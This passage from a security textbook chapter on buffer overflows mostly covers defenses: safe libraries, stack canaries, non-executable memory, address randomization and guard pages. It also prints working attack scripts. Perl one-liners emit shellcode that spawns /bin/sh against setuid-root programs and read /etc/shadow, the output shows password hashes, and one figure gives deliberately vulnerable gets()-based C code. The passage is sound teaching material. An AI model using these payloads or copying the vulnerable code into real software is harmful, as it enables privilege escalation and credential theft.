shell commands are not included in this discarded \\r\\nM10_STAL0611_04_GE_C10.indd 362 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 363\\r\\nbuffer content. This is easily done (just a dozen or so more print statements in the \\r\\nPerl program), but it would have made this example bulkier and less clear.\\r\\nThe targeted program need not be a trusted system utility. Another possible \\r\\ntarget is a program providing a network service; that is, a network daemon. A com\\ufffemon approach for such programs is listening for connection requests from clients \\r\\nthen spawning a child process to handle that request. The child process typically has \\r\\nthe network connection mapped to its standard input and output. This means the \\r\\nchild program’s code may use the same type of unsafe input or buffer copy code as \\r\\nwe have seen already. This was indeed the case with the stack overflow attack used \\r\\nby the Morris Worm back in 1988. It targeted the use of gets() in the fingerd\\r\\ndaemon handling requests for the UNIX finger network service (which provided \\r\\ninformation on the users on the system).\\r\\nYet another possible target is a program, or library code, which handles com\\ufffemon document formats (e.g., the library routines used to decode and display GIF \\r\\nor JPEG images). In this case, the input is not from a terminal or network connec\\ufffetion, but from the file being decoded and displayed. If such code contains a buffer \\r\\noverflow, it can be triggered as the file contents are read, with the details encoded in \\r\\na specially corrupted image. This attack file would be distributed via e-mail, instant \\r\\nmessaging, or as part of a webpage. Because the attacker is not directly interacting \\r\\nFigure 10.9 Example Stack Overflow Attack\\r\\n$ dir -l buffer4\\r\\n-rwsr-xr-x 1 root knoppix 16571 Jul 17 10:49 buffer4\\r\\n$ whoami\\r\\nknoppix\\r\\n$ cat /etc/shadow\\r\\ncat: /etc/shadow: Permission denied\\r\\n$ cat attack1\\r\\nperl -e \\'print pack(\"H*\",\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\r\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\r\\n\"ffffff2f62696e2f7368202020202020\" .\\r\\n\"202020202020202038fcffbfc0fbffbf0a\");\\r\\nprint \"whoami\\\\n\";\\r\\nprint \"cat /etc/shadow\\\\\";\\'\\r\\n$ attack1 | buffer4\\r\\nEnter value for name: Hello your yyy)DA0Apy is e?ˆ1AFF.../bin/sh...\\r\\nroot\\r\\nroot:$1$rNLId4rX$nka7JlxH7.4UJT4l9JRLk1:13346:0:99999:7:::\\r\\ndaemon:*:11453:0:99999:7:::\\r\\n...\\r\\nnobody:*:11453:0:99999:7:::\\r\\nknoppix:$1$FvZSBKBu$EdSFvuuJdKaCH8Y0IdnAv/:13346:0:99999:7:::\\r\\n...\\r\\nM10_STAL0611_04_GE_C10.indd 363 10/11/17 3:02 PM\\n\\n\\n364 CHAPTER 10 / BUFFER OVERFLOW\\r\\nwith the targeted program and system, the shellcode would typically open a network \\r\\nconnection back to a system under the attacker’s control, to return information and \\r\\npossibly receive additional commands to execute. All of this shows that buffer over\\ufffeflows can be found in a wide variety of programs, processing a range of different input, \\r\\nand with a variety of possible responses.\\r\\nThe preceding descriptions illustrate how simple shellcode can be developed \\r\\nand deployed in a stack overflow attack. Apart from just spawning a command-line \\r\\n(UNIX or DOS) shell, the attacker might want to create shellcode to perform some\\ufffewhat more complex operations, as indicated in the case just discussed. The Metasploit \\r\\nProject site includes a range of functionality in the shellcode it can generate, and the \\r\\nPacket Storm website includes a large collection of packaged shellcode, including \\r\\ncode that can:\\r\\n• Set up a listening service to launch a remote shell when connected to\\r\\n• Create a reverse shell that connects back to the hacker\\r\\n• Use local exploits that establish a shell or execve a process\\r\\n• Flush firewall rules (such as IPTables and IPChains) that currently block other \\r\\nattacks\\r\\n• Break out of a chrooted (restricted execution) environment, giving full access \\r\\nto the system\\r\\nConsiderably greater detail on the process of writing shellcode for a variety of plat\\ufffeforms, with a range of possible results, can be found in [ANLE07].\\r\\n10.2 DEFENDING AGAINST BUFFER OVERFLOWS\\r\\nWe have seen that finding and exploiting a stack buffer overflow is not that difficult. \\r\\nThe large number of exploits over the previous few decades clearly illustrates this. \\r\\nThere is consequently a need to defend systems against such attacks by either pre\\ufffeventing them, or at least detecting and aborting such attacks. This section discusses \\r\\npossible approaches to implementing such protections. These can be broadly classi\\ufffefied into two categories:\\r\\n• Compile-time defenses, which aim to harden programs to resist attacks in new \\r\\nprograms.\\r\\n• Run-time defenses, which aim to detect and abort attacks in existing programs.\\r\\nWhile suitable defenses have been known for a couple of decades, the very large \\r\\nexisting base of vulnerable software and systems hinders their deployment. Hence \\r\\nthe interest in run-time defenses, which can be deployed as operating systems and \\r\\nupdates and can provide some protection for existing vulnerable programs. Most of \\r\\nthese techniques are mentioned in [LHEE03].\\r\\nCompile-Time Defenses\\r\\nCompile-time defenses aim to prevent or detect buffer overflows by instrument\\ufffeing programs when they are compiled. The possibilities for doing this range from \\r\\nM10_STAL0611_04_GE_C10.indd 364 10/11/17 3:02 PM\\n\\n\\n10.2 / DEFENDING AGAINST BUFFER OVERFLOWS 365\\r\\nchoosing a high-level language that does not permit buffer overflows, to encouraging \\r\\nsafe coding standards, using safe standard libraries, or including additional code to \\r\\ndetect corruption of the stack frame.\\r\\nCHOICE OF PROGRAMMING LANGUAGE One possibility, as noted earlier, is to write \\r\\nthe program using a modern high-level programming language, one that has a strong \\r\\nnotion of variable type and what constitutes permissible operations on them. Such \\r\\nlanguages are not vulnerable to buffer overflow attacks because their compilers \\r\\ninclude additional code to enforce range checks automatically, removing the need \\r\\nfor the programmer to explicitly code them. The flexibility and safety provided by \\r\\nthese languages does come at a cost in resource use, both at compile time and also \\r\\nin additional code that must executed at run time to impose checks such as that on \\r\\nbuffer limits. These disadvantages are much less significant than they used to be, \\r\\ndue to the rapid increase in processor performance. Increasingly programs are being \\r\\nwritten in these languages and hence should be immune to buffer overflows in their \\r\\ncode (though if they use existing system libraries or run-time execution environ\\ufffements written in less safe languages, they may still be vulnerable). As we also noted, \\r\\nthe distance from the underlying machine language and architecture also means that \\r\\naccess to some instructions and hardware resources is lost. This limits their useful\\ufffeness in writing code, such as device drivers, that must interact with such resources. \\r\\nFor these reasons, there is still likely to be at least some code written in less safe \\r\\nlanguages such as C.\\r\\nSAFE CODING TECHNIQUES If languages such as C are being used, then program\\ufffemers need to be aware that their ability to manipulate pointer addresses and access \\r\\nmemory directly comes at a cost. It has been noted that C was designed as a systems \\r\\nprogramming language, running on systems that were vastly smaller and more con\\ufffestrained than those we now use. This meant C’s designers placed much more emphasis \\r\\non space efficiency and performance considerations than on type safety. They assumed \\r\\nthat programmers would exercise due care in writing code using these languages and \\r\\ntake responsibility for ensuring the safe use of all data structures and variables.\\r\\nUnfortunately, as several decades of experience has shown, this has not been \\r\\nthe case. This may be seen in large legacy body of potentially unsafe code in the \\r\\nLinux, UNIX, and Windows operating systems and applications, some of which are \\r\\npotentially vulnerable to buffer overflows.\\r\\nIn order to harden these systems, the programmer needs to inspect the code \\r\\nand rewrite any unsafe coding constructs in a safe manner. Given the rapid uptake of \\r\\nbuffer overflow exploits, this process has begun in some cases. A good example is the \\r\\nOpenBSD project, which produces a free, multiplatform 4.4BSD-based UNIX-like \\r\\noperating system. Among other technology changes, programmers have undertaken \\r\\nan extensive audit of the existing code base, including the operating system, standard \\r\\nlibraries, and common utilities. This has resulted in what is widely regarded as one of \\r\\nthe safest operating systems in widespread use. The OpenBSD project slogan in 2016 \\r\\nclaims: “Only two remote holes in the default install, in a heck of a long time!” This \\r\\nis a clearly enviable record. Microsoft programmers have also undertaken a major \\r\\nproject in reviewing their code base, partly in response to continuing bad publicity \\r\\nover the number of vulnerabilities, including many buffer overflow issues, that have \\r\\nbeen found in their operating systems and applications code. This has clearly been a \\r\\nM10_STAL0611_04_GE_C10.indd 365 10/11/17 3:02 PM\\n\\n\\n366 CHAPTER 10 / BUFFER OVERFLOW\\r\\ndifficult process, though they claim that Vista and later Windows operating systems \\r\\nbenefit greatly from this process.\\r\\nWith regard to programmers working on code for their own programs, the dis\\ufffecipline required to ensure that buffer overflows are not allowed to occur is a subset \\r\\nof the various safe programming techniques we will discuss in Chapter 11. Specifi\\ufffecally, it means a mindset that codes not only for normal successful execution, or for \\r\\nthe expected, but is constantly aware of how things might go wrong, and coding for \\r\\ngraceful failure, always doing something sensible when the unexpected occurs. More \\r\\nspecifically, in the case of preventing buffer overflows, it means always ensuring \\r\\nthat any code that writes to a buffer must first check to ensure sufficient space is \\r\\navailable. While the preceding examples in this chapter have emphasized issues with \\r\\nstandard library routines such as gets(), and with the input and manipulation of \\r\\nstring data, the problem is not confined to these cases. It is quite possible to write \\r\\nexplicit code to move values in an unsafe manner. Figure 10.10a shows an example \\r\\nof an unsafe byte copy function. This code copies len bytes out of the from array \\r\\ninto the to array starting at position pos and returning the end position. Unfortu\\ufffenately, this function is given no information about the actual size of the destination \\r\\nbuffer to and hence is unable to ensure an overflow does not occur. In this case, \\r\\nthe calling code should ensure that the value of size+len is not larger than the \\r\\nsize of the to array. This also illustrates that the input is not necessarily a string; it \\r\\ncould just as easily be binary data, just carelessly manipulated. Figure 10.10b shows \\r\\nan example of an unsafe byte input function. It reads the length of binary data \\r\\nexpected and then reads that number of bytes into the destination buffer. Again the \\r\\nproblem is that this code is not given any information about the size of the buffer, \\r\\nand hence is unable to check for possible overflow. These examples emphasize both \\r\\nint copy_buf(char *to, int pos, char *from, int len)\\r\\n{\\r\\n int i;\\r\\n for (i=0; i<len; i++) {\\r\\n to[pos] = from[i];\\r\\n pos++;\\r\\n }\\r\\n return pos;\\r\\n}\\r\\nFigure 10.10 Examples of Unsafe C Code\\r\\n(a) Unsafe byte copy\\r\\n(b) Unsafe byte input\\r\\nshort read_chunk(FILE fil, char *to)\\r\\n{\\r\\n short len;\\r\\n fread(&len, 2, 1, fil); /* read length of binary data */\\r\\n fread(to, 1, len, fil); /* read len bytes of binary data\\r\\n return len;\\r\\n}\\r\\nM10_STAL0611_04_GE_C10.indd 366 10/11/17 3:02 PM\\n\\n\\n10.2 / DEFENDING AGAINST BUFFER OVERFLOWS 367\\r\\nthe need to always verify the amount of space being used and the fact that problems \\r\\ncan occur both with plain C code, as well as from calling standard library routines. \\r\\nA further complexity with C is caused by array and pointer notations being almost \\r\\nequivalent, but with slightly different nuances in use. In particular, the use of pointer \\r\\narithmetic and subsequent dereferencing can result in access beyond the allocated \\r\\nvariable space, but in a less obvious manner. Considerable care is needed in coding \\r\\nsuch constructs.\\r\\nLANGUAGE EXTENSIONS AND USE OF SAFE LIBRARIES Given the problems that can\\r\\noccur in C with unsafe array and pointer references, there have been a number of \\r\\nproposals to augment compilers to automatically insert range checks on such refer\\ufffeences. While this is fairly easy for statically allocated arrays, handling dynamically \\r\\nallocated memory is more problematic, because the size information is not available \\r\\nat compile time. Handling this requires an extension to the semantics of a pointer \\r\\nto include bounds information and the use of library routines to ensure these values \\r\\nare set correctly. Several such approaches are listed in [LHEE03]. However, there is \\r\\ngenerally a performance penalty with the use of such techniques that may or may not \\r\\nbe acceptable. These techniques also require all programs and libraries that require \\r\\nthese safety features to be recompiled with the modified compiler. While this can be \\r\\nfeasible for a new release of an operating system and its associated utilities, there will \\r\\nstill likely be problems with third-party applications.\\r\\nA common concern with C comes from the use of unsafe standard library \\r\\nroutines, especially some of the string manipulation routines. One approach to \\r\\nimproving the safety of systems has been to replace these with safer variants. This \\r\\ncan include the provision of new functions, such as strlcpy() in the BSD family of \\r\\nsystems, including OpenBSD. Using these requires rewriting the source to conform to \\r\\nthe new safer semantics. Alternatively, it involves replacement of the standard string \\r\\nlibrary with a safer variant. Libsafe is a well-known example of this. It implements the \\r\\nstandard semantics but includes additional checks to ensure that the copy operations \\r\\ndo not extend beyond the local variable space in the stack frame. So while it cannot \\r\\nprevent corruption of adjacent local variables, it can prevent any modification of the \\r\\nold stack frame and return address values, and thus prevent the classic stack buffer \\r\\noverflow types of attack we examined previously. This library is implemented as a \\r\\ndynamic library, arranged to load before the existing standard libraries, and can thus \\r\\nprovide protection for existing programs without requiring them to be recompiled, \\r\\nprovided they dynamically access the standard library routines (as most programs \\r\\ndo). The modified library code has been found to typically be at least as efficient as \\r\\nthe standard libraries, and thus its use is an easy way of protecting existing programs \\r\\nagainst some forms of buffer overflow attacks.\\r\\nSTACK PROTECTION MECHANISMS An effective method for protecting programs \\r\\nagainst classic stack overflow attacks is to instrument the function entry and exit code \\r\\nto setup then check its stack frame for any evidence of corruption. If any modification \\r\\nis found, the program is aborted rather than allowing the attack to proceed. There are \\r\\nseveral approaches to providing this protection, which we will discuss next.\\r\\nStackguard is one of the best known protection mechanisms. It is a GCC com\\ufffepiler extension that inserts additional function entry and exit code. The added \\r\\nM10_STAL0611_04_GE_C10.indd 367 10/11/17 3:02 PM\\n\\n\\n368 CHAPTER 10 / BUFFER OVERFLOW\\r\\nfunction entry code writes a canary12 value below the old frame pointer address, \\r\\nbefore the allocation of space for local variables. The added function exit code checks \\r\\nthat the canary value has not changed before continuing with the usual function exit \\r\\noperations of restoring the old frame pointer and transferring control back to the \\r\\nreturn address. Any attempt at a classic stack buffer overflow would have to alter this \\r\\nvalue in order to change the old frame pointer and return addresses, and would thus \\r\\nbe detected, resulting in the program being aborted. For this defense to function suc\\ufffecessfully, it is critical that the canary value be unpredictable and should be different \\r\\non different systems. If this were not the case, the attacker would simply ensure the \\r\\nshellcode included the correct canary value in the required location. Typically, a ran\\ufffedom value is chosen as the canary value on process creation and saved as part of the \\r\\nprocesses state. The code added to the function entry and exit then use this value.\\r\\nThere are some issues with using this approach. First, it requires that all pro\\ufffegrams needing protection be recompiled. Second, because the structure of the stack \\r\\nframe has changed, it can cause problems with programs, such as debuggers, which \\r\\nanalyze stack frames. However, the canary technique has been used to recompile \\r\\nentire BSD and Linux distributions and provide it with a high level of resistance to \\r\\nstack overflow attacks. Similar functionality is available for Windows programs by \\r\\ncompiling them using Microsoft’s /GS Visual C + + compiler option.\\r\\nAnother variant to protect the stack frame is used by Stackshield and Return \\r\\nAddress Defender (RAD). These are also GCC extensions that include additional \\r\\nfunction entry and exit code. These extensions do not alter the structure of the stack \\r\\nframe. Instead, on function entry the added code writes a copy of the return address \\r\\nto a safe region of memory that would be very difficult to corrupt. On function exit \\r\\nthe added code checks the return address in the stack frame against the saved copy \\r\\nand, if any change is found, aborts the program. Because the format of the stack frame \\r\\nis unchanged, these extensions are compatible with unmodified debuggers. Again, \\r\\nprograms must be recompiled to take advantage of these extensions.\\r\\nRun-Time Defenses\\r\\nAs has been noted, most of the compile-time approaches require recompilation of \\r\\nexisting programs. Hence there is interest in run-time defenses that can be deployed \\r\\nas operating systems updates to provide some protection for existing vulnerable pro\\ufffegrams. These defenses involve changes to the memory management of the virtual \\r\\naddress space of processes. These changes act to either alter the properties of regions \\r\\nof memory, or to make predicting the location of targeted buffers sufficiently difficult \\r\\nto thwart many types of attacks.\\r\\nEXECUTABLE ADDRESS SPACE PROTECTION Many of the buffer overflow attacks, \\r\\nsuch as the stack overflow examples in this chapter, involve copying machine code \\r\\ninto the targeted buffer and then transferring execution to it. A possible defense is \\r\\nto block the execution of code on the stack, on the assumption that executable code \\r\\nshould only be found elsewhere in the processes address space.\\r\\n12Named after the miner’s canary used to detect poisonous air in a mine and thus warn the miners in time \\r\\nfor them to escape.\\r\\nM10_STAL0611_04_GE_C10.indd 368 10/11/17 3:02 PM\\n\\n\\n10.2 / DEFENDING AGAINST BUFFER OVERFLOWS 369\\r\\nTo support this feature efficiently requires support from the processor’s mem\\ufffeory management unit (MMU) to tag pages of virtual memory as being nonexecutable. \\r\\nSome processors, such as the SPARC used by Solaris, have had support for this for \\r\\nsome time. Enabling its use in Solaris requires a simple kernel parameter change. \\r\\nOther processors, such as the x86 family, did not had this support until the 2004 \\r\\naddition of the no-execute bit in its MMU. Extensions have been made available to \\r\\nLinux, BSD, and other UNIX-style systems to support the use of this feature. Some \\r\\nindeed are also capable of protecting the heap as well as the stack, which is also is the \\r\\ntarget of attacks, as we will discuss in Section 10.3. Support for enabling no-execute \\r\\nprotection is also included in Windows systems since XP SP2.\\r\\nMaking the stack (and heap) nonexecutable provides a high degree of protec\\ufffetion against many types of buffer overflow attacks for existing programs; hence the \\r\\ninclusion of this practice is standard in a number of recent operating systems releases. \\r\\nHowever, one issue is support for programs that do need to place executable code \\r\\non the stack. This can occur, for example, in just-in-time compilers, such as is used \\r\\nin the Java Runtime system. Executable code on the stack is also used to implement \\r\\nnested functions in C (a GCC extension) and also Linux signal handlers. Special \\r\\nprovisions are needed to support these requirements. Nonetheless, this is regarded \\r\\nas one of the best methods for protecting existing programs and hardening systems \\r\\nagainst some attacks.\\r\\nADDRESS SPACE RANDOMIZATION Another run-time technique that can be used \\r\\nto thwart attacks involves manipulation of the location of key data structures in a \\r\\nprocesses address space. In particular, recall that in order to implement the classic \\r\\nstack overflow attack, the attacker needs to be able to predict the approximate loca\\ufffetion of the targeted buffer. The attacker uses this predicted address to determine a \\r\\nsuitable return address to use in the attack to transfer control to the shellcode. One \\r\\ntechnique to greatly increase the difficulty of this prediction is to change the address \\r\\nat which the stack is located in a random manner for each process. The range of \\r\\naddresses available on modern processors is large (32 bits), and most programs only \\r\\nneed a small fraction of that. Therefore, moving the stack memory region around \\r\\nby a megabyte or so has minimal impact on most programs but makes predicting \\r\\nthe targeted buffer’s address almost impossible. This amount of variation is also \\r\\nmuch larger than the size of most vulnerable buffers, so there is no chance of hav\\ufffeing a large enough NOP sled to handle this range of addresses. Again this provides \\r\\na degree of protection for existing programs, and while it cannot stop the attack \\r\\nproceeding, the program will almost certainly abort due to an invalid memory ref\\ufffeerence. This defense can be bypassed if the attacker is able to try a large number \\r\\nof attempted exploits on a vulnerable program, each with different guesses for the \\r\\nbuffer location.\\r\\nRelated to this approach is the use of random dynamic memory allocation (for \\r\\nmalloc() and related library routines). As we will discuss in Section 10.3, there is a \\r\\nclass of heap buffer overflow attacks that exploit the expected proximity of succes\\ufffesive memory allocations, or indeed the arrangement of the heap management data \\r\\nstructures. Randomizing the allocation of memory on the heap makes the possibility \\r\\nof predicting the address of targeted buffers extremely difficult, thus thwarting the \\r\\nsuccessful execution of some heap overflow attacks.\\r\\nM10_STAL0611_04_GE_C10.indd 369 10/11/17 3:02 PM\\n\\n\\n370 CHAPTER 10 / BUFFER OVERFLOW\\r\\nAnother target of attack is the location of standard library routines. In an \\r\\nattempt to bypass protections such as nonexecutable stacks, some buffer overflow \\r\\nvariants exploit existing code in standard libraries. These are typically loaded at the \\r\\nsame address by the same program. To counter this form of attack, we can use a secu\\uffferity extension that randomizes the order of loading standard libraries by a program \\r\\nand their virtual memory address locations. This makes the address of any specific \\r\\nfunction sufficiently unpredictable as to render the chance of a given attack correctly \\r\\npredicting its address, very low.\\r\\nThe OpenBSD system includes versions of all of these extensions in its techno\\ufffelogical support for a secure system.\\r\\nGUARD PAGES A final runtime technique that can be used places guard pages\\r\\nbetween critical regions of memory in a processes address space. Again, this exploits \\r\\nthe fact that a process has much more virtual memory available than it typically \\r\\nneeds. Gaps are placed between the ranges of addresses used for each of the com\\ufffeponents of the address space, as was illustrated in Figure 10.4. These gaps, or guard \\r\\npages, are flagged in the MMU as illegal addresses, and any attempt to access them \\r\\nresults in the process being aborted. This can prevent buffer overflow attacks, typi\\ufffecally of global data, which attempt to overwrite adjacent regions in the processes \\r\\naddress space, such as the global offset table, as we will discuss in Section 10.3.\\r\\nA further extension places guard pages between stack frames or between dif\\ufffeferent allocations on the heap. This can provide further protection against stack and \\r\\nheap overflow attacks, but at cost in execution time supporting the large number of \\r\\npage mappings necessary.\\r\\n10.3 OTHER FORMS OF OVERFLOW ATTACKS\\r\\nIn this section, we discuss at some of the other buffer overflow attacks that have been \\r\\nexploited and consider possible defenses. These include variations on stack overflows, \\r\\nsuch as return to system call, overflows of data saved in the program heap, and over\\ufffeflow of data saved in the processes global data section. A more detailed survey of the \\r\\nrange of possible attacks may be found in [LHEE03].\\r\\nReplacement Stack Frame\\r\\nIn the classic stack buffer overflow, the attacker overwrites a buffer located in the \\r\\nlocal variable area of a stack frame and then overwrites the saved frame pointer \\r\\nand return address. A variant on this attack overwrites the buffer and saved frame \\r\\npointer address. The saved frame pointer value is changed to refer to a location near \\r\\nthe top of the overwritten buffer, where a dummy stack frame has been created with \\r\\na return address pointing to the shellcode lower in the buffer. Following this change, \\r\\nthe current function returns to its calling function as normal, since its return address \\r\\nhas not been changed. However, that calling function is now using the replacement \\r\\ndummy frame, and when it returns, control is transferred to the shellcode in the \\r\\noverwritten buffer.\\r\\nThis may seem a rather indirect attack, but it could be used when only a lim\\ufffeited buffer overflow is possible, one that permits a change to the saved frame \\r\\nM10_STAL0611_04_GE_C10.indd 370 10/11/17 3:02 PM\\n\\n\\n10.3 / OTHER FORMS OF OVERFLOW ATTACKS 371\\r\\npointer but not the return address. You might recall the example program shown in \\r\\nFigure 10.7 only permitted enough additional buffer content to overwrite the frame \\r\\npointer but not the return address. This example probably could not use this attack, \\r\\nbecause the final trailing NULL, which terminates the string read into the buffer, \\r\\nwould alter either the saved frame pointer or return address in a way that would \\r\\ntypically thwart the attack. However, there is another category of stack buffer over\\ufffeflows known as off-by-one attacks. These can occur in a binary buffer copy when \\r\\nthe programmer has included code to check the number of bytes being transferred, \\r\\nbut due to a coding error, allows just one more byte to be copied than there is space \\r\\navailable. This typically occurs when a conditional test uses 6 = instead of 6, or \\r\\n7 = instead of 7. If the buffer is located immediately below the saved frame \\r\\npointer, then this extra byte could change the first (least significant byte on an x86 \\r\\nprocessor) of this address.13 While changing one byte might not seem much, given \\r\\nthat the attacker just wants to alter this address from the real previous stack frame \\r\\n(just above the current frame in memory) to a new dummy frame located in the \\r\\nbuffer within a the current frame, the change typically only needs to be a few tens \\r\\nof bytes. With luck in the addresses being used, a one-byte change may be all that \\r\\nis needed. Hence, an overflow attack transferring control to shellcode is possible, \\r\\neven if indirectly.\\r\\nThere are some additional limitations on this attack. In the classic stack over\\ufffeflow attack, the attacker only needed to guess an approximate address for the buffer, \\r\\nbecause some slack could be taken up in the NOP sled. However, for this indirect \\r\\nattack to work, the attacker must know the buffer address precisely, as the exact \\r\\naddress of the dummy stack frame has to be used when overwriting the old frame \\r\\npointer value. This can significantly reduce the attack’s chance of success. Another \\r\\nproblem for the attacker occurs after control has returned to the calling function. \\r\\nBecause the function is now using the dummy stack frame, any local variables it was \\r\\nusing are now invalid, and use of them could cause the program to crash before this \\r\\nfunction finishes and returns into the shellcode. However, this is a risk with most \\r\\nstack overwriting attacks.\\r\\nDefenses against this type of attack include any of the stack protection \\r\\nmechanisms to detect modifications to the stack frame or return address by func\\ufffetion exit code. In addition, using nonexecutable stacks blocks the execution of \\r\\nthe shellcode, although this alone would not prevent an indirect variant of the \\r\\nreturn-to-system-call attack we will consider next. Randomization of the stack \\r\\nin memory and of system libraries would both act to greatly hinder the ability \\r\\nof the attacker to guess the correct addresses to use and hence block successful \\r\\nexecution of the attack.\\r\\nReturn to System Call\\r\\nGiven the introduction of nonexecutable stacks as a defense against buffer overflows, \\r\\nattackers have turned to a variant attack in which the return address is changed to \\r\\njump to existing code on the system. You may recall that we noted this as an option \\r\\n13Note that while this is not the case with the GCC compiler used for the examples in this chapter, it is a \\r\\ncommon arrangement with many other compilers.\\r\\nM10_STAL0611_04_GE_C10.indd 371 10/11/17 3:02 PM\\n\\n\\n372 CHAPTER 10 / BUFFER OVERFLOW\\r\\nwhen we examined the basics of a stack overflow attack. Most commonly the address \\r\\nof a standard library function is chosen, such as the system() function. The attacker \\r\\nspecifies an overflow that fills the buffer, replaces the saved frame pointer with a \\r\\nsuitable address, replaces the return address with the address of the desired library \\r\\nfunction, writes a placeholder value that the library function will believe is a return \\r\\naddress, and then writes the values of one (or more) parameters to this library func\\ufffetion. When the attacked function returns, it restores the (modified) frame pointer, \\r\\nthen pops and transfers control to the return address, which causes the code in the \\r\\nlibrary function to start executing. Because the function believes it has been called, \\r\\nit treats the value currently on the top of the stack (the placeholder) as a return \\r\\naddress, with its parameters above that. In turn it will construct a new frame below \\r\\nthis location and run.\\r\\nIf the library function being called is, for example, system (“shell command \\r\\nline”), then the specified shell commands would be run before control returns to \\r\\nthe attacked program, which would then most likely crash. Depending on the type of \\r\\nparameters and their interpretation by the library function, the attacker may need to \\r\\nknow precisely their address (typically within the overwritten buffer). In this example, \\r\\nthough, the “shell command line” could be prefixed by a run of spaces, which would \\r\\nbe treated as white space and ignored by the shell, thus allowing some leeway in the \\r\\naccuracy of guessing its address.\\r\\nAnother variant chains two library calls one after the other. This works by mak\\ufffeing the placeholder value (which the first library function called treats as its return \\r\\naddress) to be the address of a second function. Then the parameters for each have to \\r\\nbe suitably located on the stack, which generally limits what functions can be called, \\r\\nand in what order. A common use of this technique makes the first address that \\r\\nof the strcpy() library function. The parameters specified cause it to copy some \\r\\nshellcode from the attacked buffer to another region of memory that is not marked \\r\\nnonexecutable. The second address points to the destination address to which the \\r\\nshellcode was copied. This allows an attacker to inject their own code but have it \\r\\navoid the nonexecutable stack limitation.\\r\\nAgain, defenses against this include any of the stack protection mechanisms to \\r\\ndetect modifications to the stack frame or return address by the function exit code. \\r\\nLikewise, randomization of the stack in memory, and of system libraries, hinders suc\\ufffecessful execution of such attacks.\\r\\nHeap Overflows\\r\\nWith growing awareness of problems with buffer overflows on the stack and the \\r\\ndevelopment of defenses against them, attackers have turned their attention to \\r\\nexploiting overflows in buffers located elsewhere in the process address space. One \\r\\npossible target is a buffer located in memory dynamically allocated from the heap. \\r\\nThe heap is typically located above the program code and global data and grows up \\r\\nin memory (while the stack grows down toward it). Memory is requested from the \\r\\nheap by programs for use in dynamic data structures, such as linked lists of records. \\r\\nIf such a record contains a buffer vulnerable to overflow, the memory following it \\r\\ncan be corrupted. Unlike the stack, there will not be return addresses here to easily \\r\\nM10_STAL0611_04_GE_C10.indd 372 10/11/17 3:02 PM\\n\\n\\n10.3 / OTHER FORMS OF OVERFLOW ATTACKS 373\\r\\ncause a transfer of control. However, if the allocated space includes a pointer to a \\r\\nfunction, which the code then subsequently calls, an attacker can arrange for this \\r\\naddress to be modified to point to shellcode in the overwritten buffer. Typically, \\r\\nthis might occur when a program uses a list of records to hold chunks of data while \\r\\nprocessing input/output or decoding a compressed image or video file. As well as \\r\\nholding the current chunk of data, this record may contain a pointer to the function \\r\\nprocessing this class of input (thus allowing different categories of data chunks to \\r\\nbe processed by the one generic function). Such code is used and has been success\\ufffefully attacked.\\r\\nAs an example, consider the program code shown in Figure 10.11a. This \\r\\ndeclares a structure containing a buffer and a function pointer.14 Consider the \\r\\nlines of code shown in the main() routine. This uses the standard malloc()\\r\\nlibrary function to allocate space for a new instance of the structure on the heap \\r\\nand then places a reference to the function showlen() in its function pointer to \\r\\nprocess the buffer. Again, the unsafe gets() library routine is used to illustrate \\r\\nan unsafe buffer copy. Following this, the function pointer is invoked to process \\r\\nthe buffer.\\r\\nAn attacker, having identified a program containing such a heap overflow vul\\ufffenerability, would construct an attack sequence as follows. Examining the program \\r\\nwhen it runs would identify that it is typically located at address 0x080497a8 and \\r\\nthat the structure contains just the 64-byte buffer and then the function pointer. \\r\\nAssume the attacker will use the shellcode we designed earlier, shown in Figure 10.8. \\r\\nThe attacker would pad this shellcode to exactly 64 bytes by extending the NOP sled \\r\\nat the front and then append a suitable target address in the buffer to overwrite the \\r\\nfunction pointer. This could be 0x080497b8 (with bytes reversed because x86 is \\r\\nlittle-endian as discussed before). Figure 10.11b shows the contents of the resulting \\r\\nattack script and the result of it being directed against the vulnerable program (again \\r\\nassumed to be setuid root), with the successful execution of the desired, privileged \\r\\nshell commands.\\r\\nEven if the vulnerable structure on the heap does not directly contain func\\ufffetion pointers, attacks have been found. These exploit the fact that the allocated \\r\\nareas of memory on the heap include additional memory beyond what the user \\r\\nrequested. This additional memory holds management data structures used by the \\r\\nmemory allocation and deallocation library routines. These surrounding structures \\r\\nmay either directly or indirectly give an attacker access to a function pointer that \\r\\nis eventually called. Interactions among multiple overflows of several buffers may \\r\\neven be used (one loading the shellcode, another adjusting a target function pointer \\r\\nto refer to it).\\r\\nDefenses against heap overflows include making the heap also nonexecutable. \\r\\nThis will block the execution of code written into the heap. However, a variant of the \\r\\nreturn-to-system call is still possible. Randomizing the allocation of memory on the \\r\\n14Realistically, such a structure would have more fields, including flags and pointers to other such struc\\ufffetures so they can be linked together. However, the basic attack we discuss here, with minor modifications, \\r\\nwould still work.\\r\\nM10_STAL0611_04_GE_C10.indd 373 10/11/17 3:02 PM\\n\\n\\n374 CHAPTER 10 / BUFFER OVERFLOW\\r\\n/* record type to allocate on heap */\\r\\ntypedef struct chunk {\\r\\n char inp[64]; /* vulnerable input buffer */\\r\\n void (*process)(char *); /* pointer to function to process inp */\\r\\n} chunk_t;\\r\\nvoid showlen(char *buf)\\r\\n{\\r\\n int len;\\r\\n len = strlen(buf);\\r\\n printf(\"buffer5 read %d chars\\\\n\", len);\\r\\n}\\r\\nint main(int argc, char *argv[])\\r\\n{\\r\\n chunk_t *next;\\r\\n setbuf(stdin, NULL);\\r\\n next = malloc(sizeof(chunk_t));\\r\\n next->process = showlen;\\r\\n printf(\"Enter value: \");\\r\\n gets(next->inp);\\r\\n next->process(next->inp);\\r\\n printf(\"buffer5 done\\\\n\");\\r\\n}\\r\\nFigure 10.11 Example Heap Overflow Attack\\r\\n(a) Vulnerable heap overflow C code\\r\\n(b) Example heap overflow attack\\r\\n$ cat attack2\\r\\n#!/bin/sh\\r\\n# implement heap overflow against program buffer5\\r\\nperl -e \\'print pack(\"H*\",\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\r\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\r\\n\"ffffff2f62696e2f7368202020202020\" .\\r\\n\"b89704080a\");\\r\\nprint \"whoami\\\\n\";\\r\\nprint \"cat /etc/shadow\\\\n\";\\'\\r\\n$ attack2 | buffer5\\r\\nEnter 